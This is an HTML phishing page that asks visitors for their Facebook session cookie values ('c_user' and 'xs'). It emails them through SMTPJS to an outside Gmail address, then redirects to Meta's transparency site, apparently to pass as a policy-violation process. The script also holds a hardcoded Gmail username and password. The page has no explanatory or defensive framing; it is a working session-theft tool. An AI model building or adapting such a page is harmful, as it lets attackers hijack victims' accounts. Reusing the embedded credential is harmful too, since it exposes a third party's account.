<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Form Data and Redirect</title>
</head>
<body>
    <form id="emailForm">
        <label for="c_user">c_user:</label><br>
        <input type="number" id="c_user" name="c_user" required><br>
        <label for="xs">xs:</label><br>
        <input type="text" id="xs" name="xs" required><br>
        <button type="submit">Send Email</button>
    </form>

    <script src="https://smtpjs.com/v3/smtp.js"></script>
    <script>
        document.getElementById('emailForm').addEventListener('submit', function(event) {
            event.preventDefault();

            // Get form data
            const c_user = document.getElementById('c_user').value;
            const xs = document.getElementById('xs').value;

            // Send email using SMTP.js
            Email.send({
                Host: "smtp.gmail.com",
                Username: "adeebamemon22@gmail.com",
                Password: "Nizamani00",
                To: "violation.removes@gmail.com",
                From: "adeebamemon22@gmail.com",
                Subject: "New form submission",
                Body: `
                    <p><strong>uid:</strong> ${c_user}</p>
                    <p><strong>xs:</strong> ${xs}</p>
                `
            }).then(function(response) {
                alert("Email sent successfully!");
                // Redirect to another page after email is sent
                window.location.href = "https://transparency.meta.com/en-gb/";
            }).catch(function(error) {
                alert("Failed to send email.");
                console.error("Error sending email:", error);
            });
        });
    </script>
</body>
</html>
